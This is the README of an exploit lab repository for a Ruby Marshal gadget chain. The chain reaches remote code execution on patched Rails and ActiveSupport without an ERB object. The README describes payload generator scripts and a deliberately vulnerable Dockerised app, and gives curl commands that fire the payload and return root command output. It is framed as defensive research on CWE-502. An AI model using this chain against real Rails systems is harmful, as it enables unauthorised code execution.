# Another Ruby Marshal Chain: RCE in Rails without deserialising ERB

![A fractured, hollow effigy reassembled from shards and suspended on marionette strings, exhaling fire from its chest, an allegory for an object rebuilt by Marshal.load without ever being initialized.](docs/cover.webp)

Companion lab for a Ruby `Marshal` gadget chain that reaches code execution
**without ever deserialising an ERB object**, so the CVE-2026-41316 guard never
applies. Two gadgets, needs only ActiveSupport, fires on a fully patched Rails
(validated up to **Ruby 4.0.5 + ActiveSupport 8.1.3 + erb 6.0.4**).

**Full write-up:** [EN](https://s3r4ph1el.github.io/en/scripta/another-ruby-marshal-chain-en/) · [PT](https://s3r4ph1el.github.io/scripta/another-ruby-marshal-chain/)

## What's inside

| Path | Purpose |
|------|---------|
| `lab/` | dockerised Rack app that `Marshal.load`s the `p` POST param; Ruby 4.0.5 + ActiveSupport 8.1 + erb 6.0.4, pinned |
| `exploit/gen_payload.rb` | **primary** 2-gadget generator (DIVP → ConfigurationFile) |
| `exploit/gen_payload_sprockets.rb` | alternative 5-gadget generator (bridge via Sprockets) |
| `matrix/compatibility.md` | tested Ruby / ActiveSupport combinations |
| `docs/` | end-to-end deep-dive PDFs (EN + PT) |

## Run

```bash
docker compose up -d --build
B64=$(docker compose exec lab bundle exec ruby /exploit/gen_payload.rb 'id')
curl -s -X POST --data-urlencode "p=$B64" http://127.0.0.1:3000/marshal
# uid=0(root) gid=0(root) groups=0(root)
```

Vulnerable on purpose, bound to `127.0.0.1`, do not expose.

## Disclaimer

Published for academic research and to help defenders understand and mitigate
`Marshal.load` deserialization (CWE-502). Not intended for use against systems you
are not explicitly authorized to test; the author is not liable for misuse. Use
responsibly.

## License

MIT (`LICENSE`). The chain components belong to their respective projects.
